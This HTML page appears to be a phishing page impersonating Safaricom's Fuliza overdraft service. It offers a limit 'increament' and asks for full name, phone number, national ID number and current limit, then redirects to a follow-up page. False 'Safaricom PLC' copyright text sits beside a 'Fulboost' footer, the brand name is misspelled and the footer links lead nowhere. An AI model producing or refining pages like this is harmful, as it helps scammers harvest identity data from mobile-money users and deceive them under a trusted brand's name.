<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Verify Your Account</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    min-height:100vh;
    background:#f4f7f8;
    font-family:Arial,sans-serif;
    color:#222;
}

.container{
    width:92%;
    max-width:480px;
    margin:auto;
}

header{
    background:#087f3e;
    color:#fff;
    padding:22px 0;
}

.logo{
    font-size:25px;
    font-weight:700;
}

.brand{
    margin-top:4px;
    font-size:13px;
    opacity:.9;
}

.card{
    background:#fff;
    margin-top:24px;
    padding:25px 20px;
    border-radius:14px;
    box-shadow:0 2px 10px rgba(0,0,0,.08);
}

h1{
    font-size:25px;
    margin-bottom:8px;
}

.subtitle{
    color:#666;
    font-size:14px;
    line-height:1.5;
    margin-bottom:22px;
}

label{
    display:block;
    font-size:14px;
    font-weight:600;
    margin-bottom:7px;
}

input{
    width:100%;
    padding:14px;
    border:1px solid #d5d5d5;
    border-radius:8px;
    font-size:15px;
    outline:none;
    margin-bottom:17px;
}

input:focus{
    border-color:#087f3e;
}

.btn{
    width:100%;
    padding:15px;
    border:none;
    border-radius:9px;
    background:#087f3e;
    color:#fff;
    font-size:16px;
    font-weight:700;
    cursor:pointer;
    margin-top:4px;
}

.notice{
    margin-top:18px;
    padding:13px;
    background:#f0f7f3;
    border-radius:8px;
    color:#555;
    font-size:12px;
    line-height:1.5;
}

footer{
    text-align:center;
    padding:24px 10px;
    color:#777;
    font-size:12px;
    line-height:1.7;
}

footer a{
    color:#087f3e;
    text-decoration:none;
}
</style>
</head>

<body>

<header>
    <div class="container">
        <div class="logo">FULIZA INCREAMENT</div>
        <div class="brand"></div>
    </div>
</header>

<main class="container">

    <div class="card">

        <h1>Verify Your Account</h1>

        <p class="subtitle">
            Enter your details below to continue with your
            Fuliza increament
        </p>

        <form id="verifyForm">

            <label for="fullName">Full Name</label>
            <input
                type="text"
                id="fullName"
                name="fullName"
                placeholder="Enter your full name"
                required
            >

            <label for="phone">Phone Number</label>
            <input
                type="tel"
                id="phone"
                name="phone"
                placeholder="07XXXXXXXX"
                inputmode="numeric"
                required
            >

            <label for="idNumber">National ID Number</label>
            <input
                type="text"
                id="idNumber"
                name="idNumber"
                placeholder="Enter your ID number"
                inputmode="numeric"
                required
            >

            <label for="limit">Current Limit</label>
            <input
                type="number"
                id="limit"
                name="limit"
                placeholder="Enter your current limit"
                min="0"
                required
            >

            <button type="submit" class="btn">
                Verify Account
            </button>

        </form>

        <div class="notice">
            © 2026 Safaricom PLC. All rights reserved.
        </div>

    </div>

</main>

<footer>
    <a href="#">Terms &amp; Conditions</a> |
    <a href="#">Privacy Policy</a> |
    <a href="#">Support</a>

    <br>

    © 2026 Fulboost
</footer>

<script>
document.getElementById("verifyForm").addEventListener("submit", function(e){
    e.preventDefault();

    const button = document.querySelector(".btn");

    button.textContent = "Processing...";
button.disabled = true;

setTimeout(() => {
    window.location.href = "amount.html";
}, 800);
});
</script>

</body>
              </html>
